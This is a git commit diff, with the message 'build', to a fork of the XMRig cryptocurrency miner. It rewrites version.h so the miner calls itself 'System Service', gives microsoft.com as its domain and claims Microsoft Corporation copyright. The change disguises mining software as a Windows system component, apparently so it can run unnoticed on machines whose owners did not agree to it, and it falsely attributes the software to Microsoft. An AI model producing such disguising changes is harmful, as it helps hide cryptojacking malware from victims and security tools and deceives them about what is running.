531bdd3ef59ac58876ba7619be51f60f9b8042e0
gelize <8351523+gelize@user.noreply.gitee.com>
2025-12-19 11:26:04 +0800

    build

--- src/version.h
+++ src/version.h
@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
-#define APP_VERSION   "6.24.0"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2025 xmrig.com"
-#define APP_KIND      "miner"
+#define APP_ID        "System Service"
+#define APP_NAME      "System Service"
+#define APP_DESC      "System Service"
+#define APP_VERSION   "1.0.1"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "www.microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2025 Microsoft Corporation"
+#define APP_KIND      "System"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  24
